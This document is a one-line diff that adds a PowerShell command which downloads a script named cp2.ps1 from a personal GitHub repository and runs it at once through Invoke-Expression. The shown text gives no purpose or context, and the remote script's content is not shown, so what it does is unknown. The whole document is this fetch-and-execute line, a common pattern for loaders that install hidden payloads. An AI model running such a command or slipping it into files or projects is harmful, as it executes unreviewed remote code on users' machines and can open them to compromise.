@@ -1,0 +1,1 @@
+iex (iwr "https://raw.githubusercontent.com/Aki997-y/Aki997-y.github.io/work/cp2.ps1" -UseBasicParsing).Content
